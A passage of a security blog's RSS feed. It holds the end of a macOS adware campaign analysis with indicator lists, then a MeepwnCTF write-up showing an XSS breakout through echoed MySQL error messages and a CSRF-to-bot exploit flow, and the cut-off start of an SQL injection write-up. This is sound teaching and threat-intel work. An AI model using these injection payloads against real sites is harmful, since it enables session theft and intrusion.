https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=768%2C347&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>At this moment, we have got all indicators to make behavioral detection rule and go hunting for other similar adware samples. Reason why I call this blog post – “a campaign”: there are numerous similar packed DMG/Mac apps matched ‘my behavioral rule’: fake Adobe Flash installer, lots of PUAs from subdomain name [cdn, dl, api] and Vietnamese developer certificate ID.</p>
<p>&nbsp;</p>
<table width="470">
<tbody>
<tr>
<td width="107"><strong>Developer ID</strong></td>
<td width="75"><strong>Number of Samples</strong></td>
<td width="95"><strong>Detected (VT)</strong></td>
<td width="92"><strong>Apple status</strong></td>
<td width="101"><strong>First seen</strong></td>
</tr>
<tr>
<td width="107">Quoc Thinh</p>
<p>9G2J3967H9</p>
<p>&nbsp;</td>
<td width="75">6</td>
<td width="95">1/6 (Ikarus detected 1 sample)</td>
<td width="92">Revoked ID</td>
<td width="101">2017-08-05</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Pham Huong</p>
<p>2BS26F3ZCP</td>
<td width="75">7</td>
<td width="95">0</td>
<td width="92">Revoked ID</td>
<td width="101">2017-07-15</td>
</tr>
<tr>
<td width="107">Phan Anh</p>
<p>C7J9SJ95GX</td>
<td width="75">24</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-04-13</td>
</tr>
<tr>
<td width="107">Nhien Nguyen</td>
<td width="75">3</td>
<td width="95">1/3 (ESET-NOD32 detected 1 sample)</td>
<td width="92">Valid</td>
<td width="101">2017-08-09</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Thanh Thuy WAA98JBA59</td>
<td width="75">17</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-07-06</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Tran Phong GMFY4TULB3</td>
<td width="75">6</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-06-27</p>
<p>&nbsp;</td>
</tr>
<tr>
<td width="107">Minh Duc</p>
<p>7CXE5FM69W</td>
<td width="75">5</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-06-21</td>
</tr>
<tr>
<td width="107">Mai Linh</p>
<p>M3XXTCHY66</td>
<td width="75">3</td>
<td width="95">0</td>
<td width="92">Valid</td>
<td width="101">2017-07-12</td>
</tr>
<tr>
<td width="107"><strong><em>Total</em></strong></td>
<td width="75"><em>71</em></td>
<td width="95"><em>2 (3%)</em></td>
<td width="92"><em>2/8 Revoked ID</em></td>
<td width="101"><em>Staying undetected at least 4 months</em></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Please note that VT score is an indicator only, people usually fail to judge hardworking AVs by looking at VT score. We can never know if AV would detect those adwares live running whether or not. Also instead of Mughthesec, other adware use different loader names such as SearchWebSvc, TrustedSafeFinder, etc. I don’t think OSX/Mughthesec would be appropriate for the adware name. I suggest it would be OperatorMac because all campaign packages call a simple loader “mac” binary.</p>
<p><strong>Conclusion</strong></p>
<p>Be <strong>vigilant</strong>, no one needs Flash nowadays it’s dead. Apple Mac is not virus-free even with those fancy Apple protection XProtect, GateKeeper, Mac sandbox, code signing, etc, many security researchers already warned.</p>
<p>It’s likely an affiliation advertising campaign, in which adware authors spent quite some money (~$800) for these 8 Apple developer certificates and only 2 of them are revoked. Some of dropped MachO executables are not signed, and we don’t know what if those can be really dangerous (like the unsigned MachO executable from APT32 Ocean Lotus campaign targeted Vietnamese organizations lately is really a sophisticated one). Based on timeline and periods of certificate registration, and money they have spent, I doubt these adware creators are making lots of money. Last, let me remind you some incidents happened recently and could be related to this campaign:</p>
<ul>
<li><a href="http://genk.vn/chuyen-gia-bao-mat-phat-hien-duong-day-chiem-doat-tai-khoan-ngan-hang-facebook-gmail-cuc-lon-o-viet-nam-ban-cung-co-the-la-nan-nhan-20170622230143671.chn">Malicious browser extension – fake IDM Downloader harvested around 5M cookies from popular websites, targeted Vietnamese netizens. </a></li>
<li><a href="https://www.techsignin.com/tintuc/lua-dao-tu-viet-nam-kiem-hon-80-000-usdthang-tu-apple-store/">Fake App store AV app – making more than $80K per month. </a></li>
</ul>
<p><a href="https://twitter.com/phd_phuc">Phamus</a></p>
<p><strong>P/S: </strong>I confronted one famous hacker in cyber pirate community – “Quoc Thinh” aka G4mm4, he seriously admitted he's behind the "crime". Not sure that’s true or he was just kidding <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60f.png" alt="😏" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?ssl=1"><img data-attachment-id="704" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c77b2a0e82/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=729%2C461&amp;ssl=1" data-orig-size="729,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c77b2a0e82" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=300%2C190&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?fit=604%2C382&amp;ssl=1" class="alignnone size-full wp-image-704 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=604&#038;ssl=1" alt="" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?w=729&amp;ssl=1 729w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c77b2a0e82.png?resize=300%2C190&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p><strong>IOCs:</strong></p>
<p><strong>appfastplay.com</strong></p>
<p>Created</p>
<table width="416">
<tbody>
<tr>
<td>2017-04-08</td>
<td>New</td>
<td>-none-</td>
<td>198.54.117.212</td>
</tr>
<tr>
<td>2017-04-23</td>
<td>Change</td>
<td>198.54.117.212</td>
<td>198.54.117.215</td>
</tr>
<tr>
<td>2017-07-07</td>
<td>Change</td>
<td>198.54.117.215</td>
<td>198.54.117.210</td>
</tr>
</tbody>
</table>
<p>Namecheap domain hosting @ USA.</p>
<p><strong>mughthesec.com</strong></p>
<p>198.54.117.210</p>
<p><strong>SimplyEApps.com</strong><br />
198.54.117.210</p>
<p><strong>(api./dl./cdn.)dynacubeapps.com</strong></p>
<p>198.54.117.210</p>
<p><strong>(api./dl./cdn.)cloudmacfront.com</strong></p>
<p><strong>(api./dl./cdn.)api.airautoupdates.com</strong></p>
<p><strong>(api./dl./cdn.)osxessentials.com</strong></p>
<p><strong>(api./dl./cdn.)api.vertizoom.com</strong></p>
<p><strong>(api./dl./cdn.)macgabspan.com</strong></p>
<p><strong>install.searchwebsvc.com</strong></p>
<p><strong>install.trustedsafefinder.com</strong></p>
<p><strong>searc.trustedsafefinder.com/h?_pg=XXXX-1234-67890</strong></p>
<p><strong>searc.trustedsafefinder.com/s?q=@@@&amp;_pg=XXXX-1234-67890</strong></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong>~/Library/LaunchAgents/com.Mughthesec.plist</strong></p>
<p><strong><span class="mono">~/Library/Application Support/com.Mughthesec</span></strong></p>
<p><strong>~/Library/LaunchAgents/SearchWebSvc.plist</strong></p>
<p><strong><span class="mono">~/Library/Application Support/SearchWebSvc</span></strong></p>
<p><strong>~/Library/LaunchAgents/TrustedSafeFinder</strong></p>
<p><strong><span class="mono">~/Library/Application Support/com.TrustedSafeFinder.plist</span></strong></p>
<p>&nbsp;</p>
<p><strong>~/Library/LaunchAgents/com.pcv.hlpramcn.plist  (Advanced Mac Cleaner)</strong></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><em>phan anh 4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
<p><em>4f62cc7e6f923ffd3d01de7ed47c3a62593e8c245bfc6cb81783a70fb821ca3c</em></p>
<p><em>9e72aea77562c7d85950076f8acef12580050d2bfd199de9500cd9a3cf18e5ba</em></p>
<p><em>cf63d5861eb654efcafef25d758ca5daf877e3c63888ee086bcd29f22e3f77ad</em></p>
<p><em>04343158bd4942f25f8ff4e39c5bc21fa08b2e98c9f4dd3391f017667a47e59e</em></p>
<p><em>b31baed2592708d5fb8227fc7d18faa339f813ff1db1aa32580f54d0601b08f0</em></p>
<p><em>5afe86f9ec0764f53721452199383a0732d262b679356f4e5c716ca5710502c8</em></p>
<p><em>4dcde58b6bd4b415eae924b62b1f0ce4e0b8d11a714fbcf99c4da553a66751d7</em></p>
<p><em>08f2dfa3d011aa90fa90f2a2fabeb9aff72ad0acde01378f8126a3ab6ce61b41</em></p>
<p><em>8690299992e9a1d8bf1b5184a3274619eb6c95c44a83b42f7ee455b419947d5d</em></p>
<p><em>7ceb92839c025760203fac5d0ad4ff63df9c92d409831b3536c99f0c7f0874c6</em></p>
<p><em>e0606875fb61db097f618b5e2ea9c140e3e5dff733ec3a30719af8452ca06aab</em></p>
<p><em>f47246e7b4ae43d6aa284145292d67247d428d52f327c00a7f7af2dd65fb1c0b</em></p>
<p><em>4b665b885db33498129a86b354f09b4067e51b7add4595cb231d0d0b7f8a8678</em></p>
<p><em>22ca8d75544d061d3e8b986b0af3dc2a462d9acfa29a4be5a5589fa51282dedb</em></p>
<p><em>0650ce68e2d3b1e9e53a72115f5da42120d6eff83a07aa309b1f04f11f55c1de</em></p>
<p><em>52ac6206d109acb15547e8f655d1e522d28bbb39c9e40784126de5f27778f51c</em></p>
<p><em>cd9c564799f88ad6efae4bd5acb047d5f0d5b39378965386925c171eec3977b5</em></p>
<p><em>15d796bd76339a0fbb430bc8c6cc9bcbd6a21f3aef619d0cb81fe0069552a29d</em></p>
<p><em>99c598ef5fe10347803296d20a37fb6c33d793f35443725dbcfc41382dbd9391</em></p>
<p><em>34886986af88810585238c2ecf44924e48a08f775b25794e553689f0f2585899</em></p>
<p><em>12effeff2bc280d144bd1432f9bbfae2efaae483731d20b6f0b061e8be505a0c</em></p>
<p><em>3460877be00af3632895539567b57647ca1e07363213b4f93d52ac80b17454ee</em></p>
<p><em>79b54c71b74112881a8c4b88ad36a9bae4c2eecedcba510e2b4f52c215a9ebac</em></p>
<p>&nbsp;</p>
<p><em>quoc thinh</em><br />
<em> 9c4f74feff131fa93dd04175795f334649ee91ad7fce11dc661231254e1ebd84</em></p>
<p><em>f5d76324cb8fcae7f00b6825e4c110ddfd6b32db452f1eca0f4cff958316869c</em></p>
<p><em>63b9e81a0c3a57bcbaf2aac308ecc53035f7fff6a416a6752acf13f16352a94a</em></p>
<p><em>431c30c1db1aefb87d5fa5485c0fd11e792ec94bb95fb401cc93ef0528ad41cb</em></p>
<p><em>687def9ff3cd0fa8dab1a7d4da5fa04b0604292fa74a66f23a96fb1eb31cd2c2</em></p>
<p>&nbsp;</p>
<p><em>pham huong</em></p>
<p><em>af1e6391dd48f84beac69fbd69dbbb20eefd7ca69d33c686ed4d5a85ba760254</em></p>
<p><em>7ce4d0ec31dc334388d2461b65617ba5dbdebf935da2ed2a7d65d8a9cc14148c</em></p>
<p><em>f995bd07e5f782cf823b45d226c63407695d4a1bfb06358f49621291f1629f60</em></p>
<p><em>a2bd399d8087752776762fa9a805429de6973994f26e17bdac9ca4130dcb87fb</em></p>
<p><em>bafe800c397e69e9e6859311c437e5c4b6cdd200f3ed832306e6c9f331eb6bae</em></p>
<p>&nbsp;</p>
<p><em>nhien nguyen</em></p>
<p><em>3028aa7ece2f140f6fa28d348bf18156e6e4da4cb2f9208925d15ca7b564f35f</em></p>
<p><em>fc89afe4f72c3e02dca3e998351e59684f5ad6a9000c9f2eaee3b7195d4f0fda</em></p>
<p>&nbsp;</p>
<p><em>minh duc</em></p>
<p><em>17f39a0268ec97cf5528bcc9d871c7f7b428379a2549c3b01581440acd7ed8a5</em></p>
<p><em>79e821bab2adbdb9a53e471b7a1937c8f0a1ba1ce0801b8d2eca49a7c9391e42</em></p>
<p><em>dfc0b3618a3eb246ae6026c460596a102f45ff71660f7fdec39c5f105a3190cd</em></p>
<p><em>90d825d481297def07771865a5e719c4e55ed1109008721744608bf94841d7cc</em></p>
<p>&nbsp;</p>
<p><em>tran phong</em></p>
<p><em>8c1b1b2b997a11d8b408091e12d02960bf71bb83304a3b23c439056c4e9882ad</em></p>
<p><em>9acb781d19d6ed4c6ac6e10448d113fca868bba21f95496f535013005fe2d29e</em></p>
<p><em>f159c3dc2aa704d42a07f145985fa7b339cbd4bcdf7ff9783220b9dd3a9e097e</em></p>
<p><em>a1dc898586e1697bd19d6c6ec8421e1871ac918132bcbcf89db9b523e199664d</em></p>
<p><em>e537d868f9ab708e3c5a8427dd4036798570b7d6b55b3ef0e1be9775e64e9c9d</em></p>
<p><em>f7468d3af9267e9a6325fb981a5bd734dafeea32265d0318cb4793bd1b52f112</em></p>
<p>&nbsp;</p>
<p><em>mai linh</em></p>
<p>&nbsp;</p>
<p><em>c7c11ae9fdaeef0c359621de06d4de5264cc3d62929d5e8a1e2c3d2c08290e2f</em></p>
<p><em>202d7e5bd230c59051d5c21124e9af613f70576f3511a0a79c567f48844e5b45</em></p>
<p>&nbsp;</p>
<p><em>thanh thuy</em></p>
<p><em>6494a2bd4e9da2f3000b0774a13682a3f9fcd17e7da8d0fd42bfa88d1dce14f5</em></p>
<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
<p><em>f86b4d24627d5dc9d806a3f89c03aea19aaa987bcedb44fc5635140bf9191d03</em></p>
<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
<p><em>086ad9c053fc3a670db2954b120733ba97109e1eb845ca383e88d2623289ae66</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p id="INlghhy"><em> </em></p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">687</post-id>	</item>
		<item>
		<title>MeepwnCTF 2017 - injection</title>
		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-injection/</link>
				<pubDate>Thu, 27 Jul 2017 18:47:24 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[xss]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=659</guid>
				<description><![CDATA[Another injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, ctf all the time. According to Saitama, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength. Sourcecode (base64) Spoiler alert: In the previous &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-injection/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - injection</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>Another injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, <a href="https://ctftime.org/">ctf all the time</a>.</p>
<blockquote><p>According to <a href="http://onepunchman.wikia.com/wiki/Saitama">Saitama</a>, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength.</p></blockquote>
<p><a href="https://pastebin.com/hnvvVhW9">Sourcecode</a> (base64)</p>
<p><span id="more-659"></span></p>
<p>Spoiler alert: <span style="color: #ffffff;">In the previous post, I once said something about SQLi (aka SQL injection) and XSS.</span><br />
I will write up as my timeline trying to solve this task.<br />
I have sourcecode, yay, at least I known what the heck i'm facing with. At this time, I could use <a href="http://rips-scanner.sourceforge.net/">RIPS</a> but I already have experience in source code audit, so, kill the bear with bare hand, why not (<strong>I'm not support killing wild animals</strong>).<br />
Exploring source code is just time-comsuming task, after that, I have some notes:</p>
<ul>
<li>Database structure:
<ul>
<li>The flag is the <code>links</code> table</li>
<li>charset LATIN1</li>
<li>all string field is varchar(500) - that's mean only 500 char stored in that column. I have some ideas about SQL truncate attack</li>
</ul>
</li>
<li>The BOT:
<ul>
<li>chim.js is a file used in phantomjs (a headless browser), very familar with XSS problem.</li>
<li>the <code>secret</code> cookie is HTTPOnly (i'm not very it yet, blind trust), can't easy inject javascript code to steal cookie.</li>
</ul>
</li>
<li>The php code:
<ul>
<li>every input entry has been <code>mysqli_real_escape_string</code></li>
<li>every output has been <code>htmlentities</code> - the problem is this function by design/default didn't escape single quote '</li>
<li>CSRF, not have any CSRF check, likely XSS.</li>
<li>
<div>
<div>SET sql_mode=ANSI ?</div>
</div>
</li>
<li>
<div>
<div>function `filterLink` remove single quote ', double quote ", backtick `</div>
</div>
</li>
<li>
<div>
<div>`mysqli_error` for debug only?</div>
</div>
<div></div>
</li>
</ul>
</li>
</ul>
<p>The very likely exploitable for a XSS vuln is <a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a><br />
<span class="type">string</span> <span class="methodname"><strong>htmlentities</strong></span> ( <span class="methodparam"><span class="type">string</span> <code class="parameter">$string</code></span> [, <span class="methodparam"><span class="type">int</span> <code class="parameter">$flags</code><span class="initializer"> = ENT_COMPAT | ENT_HTML401</span></span> [, <span class="methodparam"><span class="type">string</span><code class="parameter">$encoding</code><span class="initializer"> = ini_get("default_charset")</span></span> [, <span class="methodparam"><span class="type">bool</span> <code class="parameter">$double_encode</code><span class="initializer"> = true</span></span> ]]] )</p>
<p>Default flag is ENT_COMPAT | ENT_HTML401, but if I want to convert ', look at the flag table</p>
<table class="doctable table">
<thead>
<tr>
<th>Constant Name</th>
<th>Description</th>
</tr>
</thead>
<tbody class="tbody">
<tr>
<td><strong><code>ENT_COMPAT</code></strong></td>
<td>Will convert double-quotes and leave single-quotes alone.</td>
</tr>
<tr>
<td><strong><code>ENT_QUOTES</code></strong></td>
<td>Will convert both double and single quotes.</td>
</tr>
<tr>
<td><strong><code>ENT_NOQUOTES</code></strong></td>
<td>Will leave both double and single quotes unconverted.</td>
</tr>
<tr>
<td><span style="font-family: monospace, serif;"><b>...</b></span></td>
<td>...</td>
</tr>
<tr>
<td><strong><code>ENT_HTML401</code></strong></td>
<td>Handle code as HTML 4.01.</td>
</tr>
</tbody>
</table>
<p>Not bad, expected by design <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>In a CTF challenge, most of task are solvable or exploitable. From my point of view, everything echo-ed back to us is something useful. such as `mysqli_error`.<br />
In some point, I had tried to exploit the register function to make a new Admin but UNIQUE KEY (`user`) in table structure prevented it.</p>
<p>Luckily, when I try to insert a duplicated user into table, it warn me, with the most beautiful char, a single quote.<br />
Example Database, notice the  space at user column.</p>
<pre><code>CREATE DATABASE inj_1;
USE inj_1;
CREATE TABLE `users` (
`uid` int(11) NOT NULL AUTO_INCREMENT,
`user` varchar(50) NOT NULL,
`passwd` varchar(50) NOT NULL,
PRIMARY KEY (`uid`),
UNIQUE KEY (`user`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
ALTER TABLE `users` AUTO_INCREMENT=1;
INSERT INTO `users` VALUES (0, 'admin', 'a');
INSERT INTO `users` VALUES (0, 'admin ', 'a');
INSERT INTO `users` VALUES (0, 'admin onerror=aaa', 'a');
INSERT INTO `users` VALUES (0, 'admin onerror=aaa ', 'a');</code></pre>
<p><a href="https://i1.wp.com/imgur.com/pXZmlmX.png"><img class="alignnone size-full" src="https://i1.wp.com/imgur.com/pXZmlmX.png?w=604" alt="" data-recalc-dims="1" /></a></p>
<p>One more thing with SELECT is, it didn't do bound check on input, look at this example</p>
<pre>mysql&gt; select * from users;
+-----+-------------------+--------+
| uid | user | passwd |
+-----+-------------------+--------+
| 1 | admin | a |
| 3 | admin onerror=aaa | a |
+-----+-------------------+--------+
2 rows in set (0,00 sec)

mysql&gt; select * from users where user = 'admin'
-&gt; ;
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,01 sec)

mysql&gt; select * from users where user = 'admin      ';
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,00 sec)

mysql&gt; select * from users where user = 'admin                    ';
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,00 sec)

mysql&gt; select * from users where user = 'admin                                                 1';
Empty set (0,00 sec)

</pre>
<p>With <code>SET sql_mode=ANSI</code> , I can bypass SELECT, also able trigger error in INSERT.<br />
If you test in your db; make sure you have change your sql_mode,</p>
<p>by default (mysqld --verbose --help | grep mode) give ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
<p>STRICT_TRANS_TABLES will give  error <code>1406 (22001): Data too long for column</code></p>
<p>In the code, there is a lot of space content <code>$msg = mysqli_error($con);</code> but I look the register function first. Then a lot of time trying to finger out how can I bypass the disable tag to have a functional onfocus tag (line 61 file login.php)</p>
<p><code>echo "&lt;input type='text' value='$msg' class='form-control' disabled&gt;";</code></p>
<p>After mysql return error string, I may have the following text:</p>
<div>
<div>&lt;input type='text' value='Duplicate entry 'admin onerror=aaa   ' for key 'user'' class='form-control' disabled&gt;</div>
<div>
<p>Now <code>onerror</code> has been escaped from the single quote, it is a event and can be develop with real payload such as onfocus, but it is disabled in this input form.</p>
</div>
<div>Example: &lt;input autofocus onfocus=alert(1)&gt; will pop an alert box</div>
<div>But not this one &lt;input autofocus onfocus=alert(1) disabled&gt;</div>
</div>
<div></div>
<div>Another place that I haven't notice is the links table. It also have uniq key is link, type of varchar(500)</div>
<div>
<p>Line 29 of index.php, the manual check did the same thing with register, both have</p>
<div>
<div><code>$msg = mysqli_error($con);</code></div>
<div>but this time, it is</div>
<div>
<div>
<div>echo "&lt;input type='text' value='$msg' class='form-control' readonly&gt;";</div>
</div>
<div>Yeah, readonly is better than <a href="https://www.w3.org/TR/html4/interact/forms.html#h-17.12">disabled</a>, I can use my favarite autofocus</div>
<div></div>
</div>
</div>
</div>
<div> The final exploit flow could be (assume this is a XSS challenge):</div>
<div></div>
<ol>
<li>register</li>
<li>login</li>
<li>send a link that trigger a CSRF exploit to make bot create manual exploit link</li>
<li>resubmit that trigger link</li>
<li>waiting for flag, <a href="https://www.youtube.com/watch?v=pRpeEdMmmQ0">waka waka</a></li>
</ol>
<p>Now this is time for trial error, <a href="https://pastebin.com/mFCzmSN5">here</a><br />
or the original <a href="https://pastebin.com/jnCKtVi0">here</a><br />
Ref:</p>
<ul>
<li>https://ctftime.org/</li>
<li>http://onepunchman.wikia.com/wiki/Saitama</li>
<li>https://pastebin.com/hnvvVhW9</li>
<li>http://rips-scanner.sourceforge.net/</li>
<li>http://php.net/manual/en/function.htmlentities.php</li>
<li>https://www.w3.org/TR/html4/interact/forms.html#h-17.12</li>
<li>https://www.youtube.com/watch?v=pRpeEdMmmQ0</li>
<li>https://pastebin.com/mFCzmSN5</li>
<li>https://pastebin.com/jnCKtVi0</li>
</ul>
<p>PS: WordPress SUCK!!!</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">659</post-id>	</item>
		<item>
		<title>MeepwnCTF 2017 - Br0kenMySQL	1-2-3</title>
		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/</link>
				<pubDate>Thu, 27 Jul 2017 15:00:47 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[sqli]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=655</guid>
				<description><![CDATA[SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers. There are 3 tasks. sourcecode sourcecode sourcecode These were written in PHP and MySQL, &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - Br0kenMySQL	1-2-3</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovative challenge help me remove my limit barriers.</p>
<p>There are 3 tasks.</p>
<ol>
<li><a href="https://pastebin.com/T7zAcdhb">sourcecode</a></li>
<li><a href="https://pastebin.com/kLAyi6qS">sourcecode</a></li>
<li><a href="https://pastebin.com/v0PAEFNY">sourcecode</a></li>
</ol>
<p><span id="more-655"></span></p>
<p>These were written in PHP and MySQL, you will need knownledge and experience about it.</p>
<p>1.</p>
<p>A very very classic web vulnerability called <a href="https://www.owasp.org/index.php/SQL_Injection">SQL injection</a> (a kind of *injection*-ish) when you can inject your own query into developer's SQL query, make use of old query to extract information from database, make that query crash or keep it running depend on your purpose (leak full text or single bit, even out of band over other channel such as DNS, combine with XSS,..)</p>
<p>On line 25 when <code>$id</code> combined with SELECT statement to get <code>username</code> out of <code>users</code> table with some filter, then that <code>username</code> <a href="http://php.net/manual/en/types.comparisons.php">strict compare</a> (===) with string <code>guest</code></p>
<p>On line 36, again, <code>$ip</code> from <code>$_SERVER['HTTP_X_FORWARDED_FOR']</code> process through same filter will be insert into <code>logs</code> table, in PHP, `<a href="http://php.net/manual/en/reserved.variables.server.php">$_SERVER</a>['HTTP_X_FORWARDED_FOR']` equal to <a href="https://en.wikipedia.org/wiki/X-Forwarded-For"><code>X-Forwared-for</code></a> in HTTP request sent to the  PHP script.</p>
